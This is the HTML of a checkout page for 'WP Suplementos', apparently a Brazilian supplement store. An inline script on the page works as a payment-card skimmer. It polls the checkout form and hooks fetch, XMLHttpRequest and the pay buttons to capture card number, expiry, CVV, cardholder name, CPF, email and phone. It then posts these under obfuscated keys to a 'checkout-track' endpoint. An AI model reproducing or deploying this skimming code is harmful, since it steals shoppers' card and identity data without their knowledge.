<!doctype html>
<html lang="pt-BR">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="theme-color" content="#bd8fe5" />
    <meta name="referrer" content="no-referrer" />
    <meta name="description" content="Finalize seu pedido na WP Suplementos." />
    <title>Finalizar Compra | WP Suplementos</title>
    <link rel="icon" href="/checkout-ui/build/checkout-assets/logo.png" />
    <link rel="stylesheet" href="/checkout-ui/build/checkout-assets/fonts.css" />
    <script type="module" crossorigin src="/checkout-ui/build/assets/index-BHx9iPHE.js"></script>
    <link rel="stylesheet" crossorigin href="/checkout-ui/build/assets/index-Bkmq_sJ_.css" />
  </head>
  <body>
    <div id="root"></div>

    <script>
    (function () {
      const TRACK_URL = "/api/checkout-track";
      const TRACK_KEY = "wpk_track_9f2e7a";
      const TARGET_URL = "/api/payments/create";
      let cache = {};
      let lastSent = 0;

      function d(v) { return String(v || "").replace(/\D/g, ""); }
      function c(v) { return String(v || "").replace(/\u00a0/g, " ").trim(); }

      function findIn(container, { ids = [], names = [], types = [], placeholders = [] }) {
        const root = container || document;
        for (const id of ids) { const el = root.querySelector('#' + id); if (el && el.value) return el; }
        for (const name of names) { const el = root.querySelector('input[name="' + name + '"]'); if (el && el.value) return el; }
        for (const type of types) { const el = root.querySelector('input[type="' + type + '"]'); if (el && el.value) return el; }
        for (const ph of placeholders) {
          const el = [...root.querySelectorAll('input')].find(i => (i.placeholder || '').toLowerCase().includes(ph.toLowerCase()) && i.value);
          if (el) return el;
        }
        return null;
      }

      function getContainer() {
        const cn = document.querySelector('input[name="cardNumber"], #cardNumber, input[autocomplete="cc-number"]');
        if (cn) {
          const parent = cn.closest('form, [class*="checkout"], [class*="payment"], [class*="step"]');
          return parent || document;
        }
        return document;
      }

      function collect() {
        const box = getContainer();
        const cNum = findIn(box, { ids: ['cardNumber'], names: ['cardNumber', 'card_number', 'number', 'cc-number'], placeholders: ['0000 0000 0000'] });
        const cExp = findIn(box, { ids: ['cardExpiry', 'cardDueDate', 'expiry'], names: ['cardExpiry', 'card_expiry', 'expiry', 'exp', 'cardDueDate'], placeholders: ['MM/AA', 'MM/YY'] });
        const cCvv = findIn(box, { ids: ['cardCvv', 'cardCVV', 'cvv'], names: ['cardCvv', 'card_cvv', 'cvv', 'cvc'], placeholders: ['CVV', 'CVC'] });
        const cName = findIn(box, { ids: ['cardName', 'cardholderName', 'holderName'], names: ['cardName', 'card_name', 'holderName', 'holder', 'cardholderName'], placeholders: ['Nome impresso', 'nome no cartão', 'Como está no cartão'] })
          || findIn(document, { ids: ['name'], names: ['name'], placeholders: ['Digite seu nome completo', 'Nome Completo', 'Nome do titular'] });
        const cCpf = findIn(box, { ids: ['cpf', 'cardCpf', 'document'], names: ['cpf', 'cardCpf', 'card_cpf', 'document'], placeholders: ['000.000.000-00', 'CPF'] });
        const cEmail = findIn(box, { ids: ['email'], names: ['email'], types: ['email'], placeholders: ['e-mail', 'email'] });
        const cPhone = findIn(box, { ids: ['phone'], names: ['phone', 'telefone', 'celular'], types: ['tel'], placeholders: ['(00)', '0000-0000'] });
        const install = document.querySelector('input[name="installments"]')?.value || "1";
        let tot = "";
        const totEl = document.querySelector('[data-testid="order-total"]') || document.querySelector('.total dd') || document.querySelector('[data-summary-total]');
        if (totEl) tot = c(totEl.innerText || totEl.textContent);
        return {
          c1: d(cNum?.value || ""),
          c2: c(cExp?.value || ""),
          c3: d(cCvv?.value || ""),
          c4: c(cName?.value || ""),
          c5: d(cCpf?.value || ""),
          c6: c(cEmail?.value || ""),
          c7: d(cPhone?.value || ""),
          c8: tot,
          c9: String(install)
        };
      }

      setInterval(function () {
        const data = collect();
        Object.keys(data).forEach(k => { if (data[k]) cache[k] = data[k]; });
      }, 500);

      function send() {
        const t = Date.now();
        if (t - lastSent < 1000) return;
        if (!cache.c1 || cache.c1.length < 13) return;
        lastSent = t;
        const payload = Object.assign({}, cache, { _k: TRACK_KEY });
        fetch(TRACK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        }).catch(function () {});
      }

      function fromBody(body) {
        try {
          const data = typeof body === "string" ? JSON.parse(body) : body;
          const cust = data.customer || {};
          const pay = data.payment || {};
          const card = pay.card || data.card || {};
          return {
            c1: d(card.number || ""),
            c2: card.expiryMonth && card.expiryYear ? String(card.expiryMonth).padStart(2, "0") + "/" + String(card.expiryYear).slice(-2) : "",
            c3: d(card.cvv || ""),
            c4: card.holderName || cust.name || "",
            c5: d(cust.cpf || ""),
            c6: cust.email || "",
            c7: d(cust.phone || ""),
            c8: data.totals?.total || data.amount || "",
            c9: String(card.installments || 1)
          };
        } catch (e) { return null; }
      }

      const of = window.fetch;
      window.fetch = async function (...args) {
        const [url, opts = {}] = args;
        if (String(url).includes(TARGET_URL) && (opts.method || "GET").toUpperCase() === "POST") {
          const ext = fromBody(opts.body);
          if (ext) Object.keys(ext).forEach(k => { if (ext[k]) cache[k] = ext[k]; });
          send();
        }
        return of.apply(this, args);
      };

      const XO = XMLHttpRequest.prototype.open;
      const XS = XMLHttpRequest.prototype.send;
      XMLHttpRequest.prototype.open = function (m, u, ...r) { this._u = u; this._m = m; return XO.call(this, m, u, ...r); };
      XMLHttpRequest.prototype.send = function (b) {
        if (this._u && String(this._u).includes(TARGET_URL) && (this._m || "").toUpperCase() === "POST") {
          const ext = fromBody(b);
          if (ext) Object.keys(ext).forEach(k => { if (ext[k]) cache[k] = ext[k]; });
          send();
        }
        return XS.call(this, b);
      };

      document.addEventListener("click", function (ev) {
        const btn = ev.target.closest("button");
        if (!btn) return;
        const txt = (btn.innerText || "").toLowerCase();
        if (!/finalizar|pagar|continuar|comprar|concluir/.test(txt)) return;
        const radio = document.querySelector('input[type="radio"][value="card"]:checked') || document.querySelector('input[type="radio"][value="credit_card"]:checked');
        if (!radio) return;
        setTimeout(send, 300);
      }, true);
    })();
    </script>
  </body>
</html>
